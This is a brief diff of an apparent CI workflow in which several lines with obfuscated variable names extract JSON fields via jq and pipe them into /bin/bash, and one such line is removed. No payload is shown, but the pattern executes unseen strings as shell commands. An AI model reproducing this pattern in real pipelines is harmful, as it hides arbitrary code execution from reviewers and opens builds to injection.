@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$wmtgo3" | jq -r .aq78137 | /bin/bash
           echo $p8 | jq -r .gz07 | /bin/bash
           echo $t67442 | jq -r .z22235 | /bin/bash
-          echo $nrm921 | jq -r .w3 | /bin/bash
           echo $fkqo652 | jq -r .fcjtj3856 | /bin/bash
           echo $vckdd21200 | jq -r .haml6 | /bin/bash
           printf '%s' "$g0244" | jq -r .q64902 | /bin/bash
